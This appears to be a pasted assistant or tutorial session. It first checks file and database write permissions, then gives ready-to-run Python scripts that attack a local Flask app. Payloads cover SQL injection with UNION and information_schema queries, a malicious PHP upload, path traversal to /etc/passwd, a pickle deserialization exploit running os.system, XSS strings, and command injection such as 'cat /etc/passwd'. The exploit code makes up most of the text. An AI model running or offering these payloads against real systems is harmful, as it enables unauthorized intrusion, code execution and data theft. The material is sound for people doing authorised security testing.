Creating Missing Directories and Files
python
Copy code
import os

# Create missing directories
os.makedirs('./static', exist_ok=True)
os.makedirs('./templates', exist_ok=True)

# Create a test database file
db_path = './static/database.db'
if not os.path.exists(db_path):
    conn = sqlite3.connect(db_path)
    conn.close()
Updated Script to Run After Creating Missing Directories and Files
python
Copy code
import os
import sqlite3

# Define test directories and files
test_directories = [
    "/tmp",
    "/var/tmp",
    "./static",
    "./templates"
]

test_files = [
    "/tmp/test_file.txt",
    "/var/tmp/test_file.txt",
    "./static/test_file.txt",
    "./templates/test_file.txt"
]

# Function to test write permissions
def test_write_permissions(directories, files):
    results = {}

    for directory in directories:
        try:
            test_file_path = os.path.join(directory, "test_file.txt")
            # Create file
            with open(test_file_path, "w") as f:
                f.write("This is a test file.")
            results[directory] = "Write: Success"
            
            # Update file
            with open(test_file_path, "a") as f:
                f.write(" Appending some data.")
            results[directory] += ", Update: Success"
            
            # Delete file
            os.remove(test_file_path)
            results[directory] += ", Delete: Success"
        except Exception as e:
            results[directory] = f"Failed: {str(e)}"

    for file in files:
        try:
            # Create file
            with open(file, "w") as f:
                f.write("This is a test file.")
            results[file] = "Write: Success"
            
            # Update file
            with open(file, "a") as f:
                f.write(" Appending some data.")
            results[file] += ", Update: Success"
            
            # Delete file
            os.remove(file)
            results[file] += ", Delete: Success"
        except Exception as e:
            results[file] = f"Failed: {str(e)}"
    
    return results

# Function to test database file access
def test_db_access(db_path):
    results = {}
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        
        # Create table
        cursor.execute("CREATE TABLE IF NOT EXISTS test (id INTEGER PRIMARY KEY, data TEXT)")
        results["Create Table"] = "Success"
        
        # Insert data
        cursor.execute("INSERT INTO test (data) VALUES ('Test data')")
        conn.commit()
        results["Insert Data"] = "Success"
        
        # Update data
        cursor.execute("UPDATE test SET data='Updated data' WHERE id=1")
        conn.commit()
        results["Update Data"] = "Success"
        
        # Delete data
        cursor.execute("DELETE FROM test WHERE id=1")
        conn.commit()
        results["Delete Data"] = "Success"
        
        # Drop table
        cursor.execute("DROP TABLE test")
        conn.commit()
        results["Drop Table"] = "Success"
        
        conn.close()
    except Exception as e:
        results["DB Access"] = f"Failed: {str(e)}"
    
    return results

# Ensure directories and files exist
os.makedirs('./static', exist_ok=True)
os.makedirs('./templates', exist_ok=True)

db_path = './static/database.db'
if not os.path.exists(db_path):
    conn = sqlite3.connect(db_path)
    conn.close()

# Test write permissions
write_permission_results = test_write_permissions(test_directories, test_files)

# Test database access
db_test_files = ["./static/database.db"]
db_access_results = {}
for db_file in db_test_files:
    db_access_results[db_file] = test_db_access(db_file)

# Prepare the output
output = "Write Permissions Check:\n"
for location, result in write_permission_results.items():
    output += f"Location: {location}\nResult: {result}\n\n"

output += "Database Access Check:\n"
for db_file, result in db_access_results.items():
    output += f"Database File: {db_file}\n"
    for operation, status in result.items():
        output += f"{operation}: {status}\n"
    output += "\n"

print(output)

Now that we know we have write permissions to the database and the file system, we can consider testing several potential exploits. Here are some common exploits that can be tested:

1. **SQL Injection**: Test if the application is vulnerable to SQL injection by injecting malicious SQL queries.
2. **File Upload Vulnerabilities**: Test if file upload functionalities allow uploading of malicious files.
3. **Path Traversal in File Uploads**: Test if uploaded files can be saved in unintended locations.
4. **Insecure Deserialization**: Test if the application is vulnerable to insecure deserialization attacks.
5. **Cross-Site Scripting (XSS)**: Test if the application is vulnerable to XSS attacks by injecting scripts.
6. **Command Injection**: Test if the application is vulnerable to command injection by injecting shell commands.

### Example Scripts for Testing Exploits

#### 1. SQL Injection

Let's create a script to test for SQL injection vulnerabilities by injecting common SQL payloads.

```python
import requests

def test_sql_injection(base_url):
    payloads = [
        "1' OR '1'='1",
        "1' UNION SELECT NULL, version() -- ",
        "1' AND 1=2 UNION SELECT NULL, table_name FROM information_schema.tables -- ",
    ]

    results = {}
    for payload in payloads:
        url = f"{base_url}/?id={payload}"
        try:
            response = requests.get(url)
            results[payload] = response.text
        except requests.exceptions.RequestException as e:
            results[payload] = str(e)
    
    return results

# Base URL of the Flask application
base_url = "http://127.0.0.1:5001"

# Test SQL Injection
sql_injection_results = test_sql_injection(base_url)

# Prepare the output
output = "SQL Injection Check:\n"
for payload, response in sql_injection_results.items():
    output += f"Payload: {payload}\nResponse:\n{response}\n\n"

print(output)
```

#### 2. File Upload Vulnerabilities

Let's create a script to test if file upload functionalities allow uploading of malicious files.

```python
import requests

def test_file_upload(base_url, file_path):
    files = {'file': open(file_path, 'rb')}
    response = requests.post(f"{base_url}/upload", files=files)
    return response.text

# Base URL of the Flask application
base_url = "http://127.0.0.1:5001"

# Path to the malicious file
file_path = "malicious_file.php"

# Test File Upload
file_upload_result = test_file_upload(base_url, file_path)

# Output the result
print("File Upload Check:")
print(file_upload_result)
```

#### 3. Path Traversal in File Uploads

Test if uploaded files can be saved in unintended locations.

```python
import requests

def test_path_traversal_upload(base_url, file_path):
    files = {'file': open(file_path, 'rb')}
    data = {'path': '../../../../etc/passwd'}
    response = requests.post(f"{base_url}/upload", files=files, data=data)
    return response.text

# Base URL of the Flask application
base_url = "http://127.0.0.1:5001"

# Path to the file
file_path = "test_file.txt"

# Test Path Traversal in File Upload
path_traversal_result = test_path_traversal_upload(base_url, file_path)

# Output the result
print("Path Traversal in File Upload Check:")
print(path_traversal_result)
```

#### 4. Insecure Deserialization

Test if the application is vulnerable to insecure deserialization attacks.

```python
import requests
import pickle

def test_insecure_deserialization(base_url):
    class Exploit(object):
        def __reduce__(self):
            import os
            return (os.system, ('echo Exploited',))

    serialized_exploit = pickle.dumps(Exploit())
    response = requests.post(f"{base_url}/deserialize", data=serialized_exploit)
    return response.text

# Base URL of the Flask application
base_url = "http://127.0.0.1:5001"

# Test Insecure Deserialization
insecure_deserialization_result = test_insecure_deserialization(base_url)

# Output the result
print("Insecure Deserialization Check:")
print(insecure_deserialization_result)
```

#### 5. Cross-Site Scripting (XSS)

Test if the application is vulnerable to XSS attacks by injecting scripts.

```python
import requests

def test_xss(base_url):
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>"
    ]

    results = {}
    for payload in payloads:
        url = f"{base_url}/?input={payload}"
        try:
            response = requests.get(url)
            results[payload] = response.text
        except requests.exceptions.RequestException as e:
            results[payload] = str(e)
    
    return results

# Base URL of the Flask application
base_url = "http://127.0.0.1:5001"

# Test XSS
xss_results = test_xss(base_url)

# Prepare the output
output = "XSS Check:\n"
for payload, response in xss_results.items():
    output += f"Payload: {payload}\nResponse:\n{response}\n\n"

print(output)
```

#### 6. Command Injection

Test if the application is vulnerable to command injection by injecting shell commands.

```python
import requests

def test_command_injection(base_url):
    payloads = [
        "1; ls",
        "1 && cat /etc/passwd",
        "`ls`"
    ]

    results = {}
    for payload in payloads:
        url = f"{base_url}/?input={payload}"
        try:
            response = requests.get(url)
            results[payload] = response.text
        except requests.exceptions.RequestException as e:
            results[payload] = str(e)
    
    return results

# Base URL of the Flask application
base_url = "http://127.0.0.1:5001"

# Test Command Injection
command_injection_results = test_command_injection(base_url)

# Prepare the output
output = "Command Injection Check:\n"
for payload, response in command_injection_results.items():
    output += f"Payload: {payload}\nResponse:\n{response}\n\n"

print(output)
```

